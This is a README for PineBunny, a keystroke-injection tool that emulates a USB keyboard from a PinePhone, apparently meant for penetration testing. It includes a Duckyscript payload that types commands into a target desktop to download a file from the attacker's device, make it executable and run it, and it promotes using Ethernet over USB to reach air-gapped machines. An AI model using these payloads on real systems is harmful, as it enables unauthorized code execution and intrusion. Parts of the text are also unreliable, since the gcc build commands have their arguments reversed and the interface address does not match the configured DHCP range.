# PineBunny

# An attempt to implement something similar to what a Bash Bunny does on the PinePhone (Pro)

This is a recollection of scripts to enable the virtual /dev/hidg0 device on USBGadget enabled kernels and perform keystroke injection attacks emulating a keyboard. This tool is mostly useful in penetration testing assesments and engagements and the ideal devices to use this with would be any kind of Raspberry Pi model/any single board linux computer for that matter, and the PinePhone (Pro) or any other linux phone with a compatible kernel.
Even though those devices are the best ones to use, the tool should work on any device as long as it has USBGadget enabled.


# ¿How to check if my kernel is compatible?

To see if your kernel was compiled with USBGadget enabled, you can typically check the file "/proc/config.gz" to see your current kernel configuration.
Do `gunzip -c /proc/config.gz | grep CONFIG_USB_GADGET=` and check if it ends in `y`. If not you'll have to recompile the kernel yourself and enable it; which is beyond the scope of this repository.


# Installation

To install the scripts clone the repository first and cd into it, and then simply compile usleep and hid-gadget-test:
`gcc -o hid-gadget-test.c hid-gadget-test`
`gcc -o usleep.c usleep`
Then, you can simply remove the .c files and copy those along with the pinebunny and usbarsenal binaries to /usr/local/bin.
Everytime you run the 'pinebunny' script you'll have to choose the layout you want to use. BUT, if you only need to use one of them and don't want to be entering everytime you use the tool, you can hardcode it in and it won't ask you again unless you change it back. Just simply edit pinebunny at the beginning of the file from something like this:

```
#!/bin/bash

defdelay=0
kb="/dev/hidg0 keyboard"

last_cmd=""
last_string=""
line_num=0
layout=""	#Enter the name of the layout here [us, es, it]
choose=true	#Change this to false and hardcode a layout before if you only plan on using 1 keyboard distribution
```
To something like this:

```
layout="us"	#Enter the name of the layout here [us, es, it]
choose=false	#Change this to false and hardcode a layout before if you only plan on using 1 keyboard distribution
```

Only us ,es, it and fr layouts are supported right now, I'll work on more layouts when I get the time.


# Usage

The badusb script uses conventional Duckyscript, and its usage is:

`sudo usbarsenal` You need to enable /dev/hidg0 first, tho usbarsenal also has options for enabling ECM or RNDIS tethering and Mass Storage (you need to specify the loop device to use), so you'll have ethernet over USB, too. Just keep in mind that your target won't get an IP address automatically assigned without a proper dhcp server running. I personally like to use dnsmasq)
`sudo pinebunny duckypayload.txt`

# UPDATE

Now you can execute bash commands in any part of the duckyscript payload just as you would do so on a Bash Bunny! The difference being that the Bash Bunny payloads run bash commands like normal and it uses `Q STRING somethinghere` to specify the next thing is just duckyscript, and here it's backwards. By default everything is duckyscript and you specify a bash command like this: `BASH somecommandhere`.

Only limitation of running bash commands like this is that it will wait until that command finishes (with or without errors) before executing the next intruction of the payload, so some commands that execute forever until you stop them will freeze the rest of the payload from executing. There's an easy fix for that though, and that's to run that command as a background process like: `BASH someinfinitecommandhere &`, and then just disowning the process and moving on with life: `BASH disown %`. After that the process will run in the background and the rest of the payload will continue.

Enjoy using bash commands to do crazy stuff to your heart's content ^_^


# Example payload using HID + Ethernet

`usbarsenal` can enable Ethernet over USB, and that can be used for different kinds of attacks. The only thing you have to keep in mind is that you need to manually assign an IP address to the usb0 interface, as well as a netmask and you also need a proper dhcp and dns server (like dnsmasq) so that the target machine gets assigned an IP address automatically.

Let's say we have a file we want the target to download and execute, a file hosted on the PinePhone itself (like `python -m http.server` for example).
We'll need to prepare the usb0 interface and a dhcp server so the computer gets an IP assigned: `sudo usbarsenal`, `sudo ifconfig usb0 up 10.66.0.1 netmask 255.255.255.0`. Then, the dhcp server with this `dnsmasq.conf` configuration:

```
interface=usb0
dhcp-range=10.0.0.2, 10.0.0.30, 255.255.255.0, 12h
dhcp-option=3, 10.0.0.1
dhcp-option=6, 10.0.0.1 
server=8.8.8.8
log-queries
log-dhcp 
listen-address=127.0.0.1
```
`sudo dnsmasq -C dnsmasq.conf -d` We leave that running or we add it to the payload itself 

```
BASH dnsmasq -C dnsmasq.conf -d
BASH disown %
``` 
and we also leave the web server running: `python -m http.server` (or add it to the payload as well as above). Now it should work. Our example payload file looks like this, and it is aimed at a regular linux desktop:

```
DELAY 2000
ALT F2
DELAY 500
STRING xfce4-terminal
ENTER
DELAY 1000
STRING wget http://10.0.0.1:8000/hello
ENTER
DELAY 400
STRING chmod +x ./hello
ENTER
DELAY 100
STRING ./hello
ENTER
```
`sudo pinebunny payload.txt`

Remember, ethernet over USB can give you physical network access to a computer, which means you could hack an airgapped PC too!
Moreover, you are not forced to use a Duckyscript payload, you could just ignore that and launch a nmap scan physically connected over USB!
The options are endless...
